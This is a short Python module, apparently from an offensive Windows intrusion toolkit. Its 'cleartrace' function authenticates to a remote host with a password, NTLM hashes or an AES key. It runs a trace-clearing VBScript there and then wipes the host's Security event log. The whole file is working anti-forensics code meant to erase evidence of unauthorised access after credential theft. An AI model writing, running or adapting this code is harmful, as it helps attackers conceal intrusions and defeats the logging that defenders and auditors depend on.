from module import *
from module import wmiconnect
from module import vbsrun
from module import clearEventLog
import os
import time

def cleartrace(ip='', username='', password='',domain='',hashes='',aesKey=''):
    vbspath=os.path.join(os.getcwd(),"vbs","cleartrace.vbs")
    vbsrun.run_vbs(ip, username, password, domain, hashes, aesKey,vbspath)
    print("[*] sleep 3 On cycle clearEventLog Security")
    time.sleep(3)
    clearEventLog.clear(ip, username, password, domain, hashes, aesKey,"Security",id=True)